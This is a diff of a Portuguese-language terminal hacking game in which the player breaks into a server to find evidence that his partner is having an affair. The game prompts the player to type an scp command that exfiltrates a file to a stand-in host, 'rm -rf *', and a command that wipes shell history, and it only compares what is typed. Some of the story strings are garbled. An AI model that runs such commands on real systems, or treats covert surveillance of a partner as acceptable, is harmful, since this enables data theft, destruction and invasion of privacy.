+        digitar("Eu não deveria fazer isso, mas a minha desconfiança me leva a isso...", delay=0.05, cor=C.CIANO)
+
+        print(f"\n{C.CINZA}{'─' * 73}{C.RESET}")
+        time.sleep(1)
+
+        # Tutorial básico
+        tutorial_basico()
+
+        # MISSÃO 1: Conexão SSH
+        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
+        print(f"{C.AMARELO}🎯 MISSÃO 1/5: CONEXÃO REMOTA{C.RESET}")
+        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")
+
+        digitar("\n[*] Iniciando sequência de hacking...", delay=0.03, cor=C.VERDE)
+        digitar("# DICA: Vou conectar ao servidor remoto usando SSH: ssh admin@backup-cloud", delay=0.03, cor=C.CINZA)
+
+        if prompt_com_tempo("ssh admin@backup-cloud", "Conectar ao servidor backup-cloud via SSH", state, limite_tempo=45):
+            state.completar_missao('conexao_ssh')
+            sucesso("Sessão remota estabelecida com sucesso!")
+            salvar_checkpoint(state, arquivo_save, 'ssh_conectado')
+        else:
+            return state.to_dict()
+
+        exibir_status(state)
+        time.sleep(2)
+
+        # MISSÃO 2: Navegação para pasta Private
+        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
+        print(f"{C.AMARELO}🎯 MISSÃO 2/5: NAVEGAÇÃO NO SISTEMA{C.RESET}")
+        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")
+
+        digitar("\n[*] Conectado ao servidor backup-cloud", delay=0.03, cor=C.VERDE)
+        digitar("# Agora preciso navegar para a pasta 'Private' onde estão os arquivos suspeitos", delay=0.03, cor=C.CINZA)
+        digitar("# Comando: cd Private", delay=0.03, cor=C.CINZA)
+
+        if prompt_com_tempo("cd Private", "Navegar para a pasta Private", state, limite_tempo=30):
+            state.completar_missao('navegacao_private')
+            sucesso("Entrou na pasta Private!")
+            salvar_checkpoint(state, arquivo_save, 'private_acessado')
+        else:
+            return state.to_dict()
+
+        exibir_status(state)
+        time.sleep(2)
+
+        # MISSÃO 3: Listar arquivos ocultos
+        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
+        print(f"{C.AMARELO}🎯 MISSÃO 3/5: ANÁLISE DE ARQUIVOS{C.RESET}")
+        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")
+
+        digitar("\n[*] Na pasta Private. Hora de ver o que está escondido aqui.", delay=0.03, cor=C.VERDE)
+        digitar("# Vou listar todos os arquivos, incluindo os ocultos (que começam com .)", delay=0.03, cor=C.CINZA)
+        digitar("# Comando: ls -la", delay=0.03, cor=C.CINZA)
+
+        if prompt_com_tempo("ls -la", "Listar todos os arquivos incluindo ocultos", state, limite_tempo=25):
+            state.completar_missao('listar_arquivos')
+            print(f"\n{C.VERMELHO}.conversa_hotel_nobile.pdf{C.RESET} | {C.VERMELHO}.fotos_reserva_dupla.zip{C.RESET}")
+            print(f"{C.VERMELHO}.comprovante_transferencia_50k.pdf{C.RESET} | {C.VERMELHO}.emails_comprometedores.txt{C.RESET}")
+            sucesso("Arquivos suspeitos encontrados!")
+            salvar_checkpoint(state, arquivo_save, 'arquivos_listados')
+        else:
+            return state.to_dict()
+
+        exibir_status(state)
+        time.sleep(3)
+
+        # ALERTA: Juliana acorda!
+        print(f"\n{C.VERMELHO}{C.NEGRITO}* O RANGER DA CAMA... JULIANA ACORDOU! *{C.RESET}")
+        time.sleep(2)
+
+        digitar("\nJuliana: '...Amor? Ainda acordado? O que você está fazendo?'", delay=0.05, cor=C.BRANCO)
+        time.sleep(1.5)
+        digitar("\nDROGA! Ela está vindo em direção à mesa! Rápido!", delay=0.03, cor=C.VERMELHO)
+
+        print(f"\n{C.VERMELHO}{C.NEGRITO}--- DECISÃO SOB PRESSÃO ---{C.RESET}")
+        print(f"{C.BRANCO}[1]{C.RESET} EXFILTRAR (Copiar evidências via SCP)")
+        print(f"{C.BRANCO}[2]{C.RESET} DESTRUIR (Remover tudo via RM)")
+
+        escolha = ""
+        while escolha not in ["1", "2"]:
+            try:
+                escolha = input(f"\n{C.VERMELHO}[ESCOLHA 1 ou 2]: {C.RESET}").strip()
+            except KeyboardInterrupt:
+                return state.to_dict()
+
+        # MISSÃO 4: Exfiltrar ou destruir evidências
+        if escolha == "1":
+            print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
+            print(f"{C.AMARELO}🎯 MISSÃO 4/5: EXFILTRAÇÃO DE EVIDÊNCIAS{C.RESET}")
+            print(f"{C.AMARELO}{'═' * 60}{C.RESET}")
+
+            digitar("\capitulo_1_resultados. Vou copiar os arquivos suspeitos.", delay=0.03, cor=C.CINZA)
+            digitar("# Comando: scp .conversa_hotel_nobile.pdf exfil@drop:~/", delay=0.03, cor=C.CINZA)
+
+            if prompt_com_tempo("scp .conversa_hotel_nobile.pdf exfil@drop:~/", "Exfiltrar arquivo de evidências", state, limite_tempo=20):
+                state.completar_missao('exfiltrar_evidencias')
+                sucesso("Evidências exfiltradas com sucesso!")
+                state.capitulo_1_resultado = 'exfiltrar'
+            else:
+                return state.to_dict()
+
+        else:  # escolha == "2"
+            print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
+            print(f"{C.AMARELO}🎯 MISSÃO 4/5: DESTRUIÇÃO DE EVIDÊNCIAS{C.RESET}")
+            print(f"{C.AMARELO}{'═' * 60}{C.RESET}")
+
+            digitar("\capitulo_1_resultadoro viver com essas dúvidas.", delay=0.03, cor=C.CINZA)
+            digitar("# Comando: rm -rf *", delay=0.03, cor=C.CINZA)
+
+            if prompt_com_tempo("rm -rf *", "Remover todos os arquivos da pasta", state, limite_tempo=20):
+                state.completar_missao('exfiltrar_evidencias')  # Mesmo objetivo, método diferente
+                sucesso("Todos os arquivos removidos!")
+                state.capitulo_1_resultado = 'destruir'
+            else:
+                return state.to_dict()
+
+        # MISSÃO 5: Cobrir rastros
+        print(f"\n{C.AMARELO}{'═' * 60}{C.RESET}")
+        print(f"{C.AMARELO}🎯 MISSÃO 5/5: LIMPAR RASTROS{C.RESET}")
+        print(f"{C.AMARELO}{'═' * 60}{C.RESET}")
+
+        digitar("\n# Agora preciso limpar meus rastros no servidor.", delay=0.03, cor=C.CINZA)
+        digitar("# Vou limpar os logs de acesso e histórico.", delay=0.03, cor=C.CINZA)
+        digitar("# Comando: history -c && rm -f ~/.bash_history", delay=0.03, cor=C.CINZA)
+
+        if prompt_com_tempo("history -c && rm -f ~/.bash_history", "Limpar histórico e logs", state, limite_tempo=15):
+            state.completar_missao('cobrir_rastros')
+            sucesso("Rastros cobertos! Servidor limpo.")
+        else:
+            return state.to_dict()
+
+        # FINAL DO CAPÍTULO
+        exibir_status(state)
+
+        # Verificar se Juliana ainda está vindo
+        if state.risco_descoberta < 50:
+            digitar("\nVocê fecha o notebook no exato segundo em que ela toca no seu ombro.", delay=0.05, cor=C.CIANO)
+            digitar("Juliana: 'Vem dormir, amor... você trabalha demais.'", delay=0.05, cor=C.BRANCO)
+            state.operacao_sucesso = True
+        else:
+            digitar("\nEla vê a tela do computador. Os arquivos ainda estão abertos.", delay=0.05, cor=C.VERMELHO)
+            digitar("Juliana: 'Então é isso que você faz enquanto eu durmo?'", delay=0.05, cor=C.BRANCO)
+            state.registrar_falha(30)
+
+        state.capitulo_concluido = True
+        salvar_checkpoint(state, arquivo_save, 'capitulo_concluido')
+
+        # Resumo final
+        completas, total = state.verificar_progresso()
+        print(f"\n{C.VERDE}{'═' * 60}{C.RESET}")
+        print(f"{C.VERDE}✓ CAPÍTULO 1 CONCLUÍDO!{C.RESET}")
+        print(f"{C.CIANO}Decisão: {state.to_dict()['capitulo_1_resultado']}{C.RESET}")
+        print(f"{C.CIANO}Missões completadas: {completas}/{total}{C.RESET}")
+        print(f"{C.CIANO}Score final: {state.score}{C.RESET}")
+        print(f"{C.VERDE}{'═' * 60}{C.RESET}")
+
+        input(f"\n{C.CINZA}[ENTER para continuar para o próximo capítulo]{C.RESET}")
+
+        return state.to_dict()
+
+    except KeyboardInterrupt:
+        print(f"\n{C.VERMELHO}Capítulo interrompido pelo usuário.{C.RESET}")
+        return state.to_dict()
     except Exception as e:
-        print(f"{C.VERMELHO}[!] Erro ao salvar: {e}{C.RESET}")
-    
-    return dados_atualizados
+        erro(f"Erro inesperado no capítulo: {e}")
+        return state.to_dict()
 
 
-# ========== PONTO DE ENTRADA ==========
-
-if __name__ == "__main__":
-    # Dados de teste
-    dados_teste = {
-        'player_name': 'Pedro',
-        'codiname': 'SHADOW_42',
-        'current_chapter': 1,
-        'completed_chapters': [],
-        'score': 0,
-        'inventory': [],
-        'bitcoin_wallet': 0.005,
-        'privacy_level': 80,
-        'darknet_access': False,
-        'reputation': 0,
-        'last_seen': datetime.now().isoformat()
-    }
-    
-    resultado = iniciar(dados_teste, None)
-    
-    print(f"\n{C.VERDE}Capítulo 1 concluído!{C.RESET}")
-    print(f"Resultado: {resultado.get('capitulo_1_resultado', 'N/A')}")
-    print(f"Sucesso: {resultado.get('capitulo_1_operacao_sucesso', False)}")
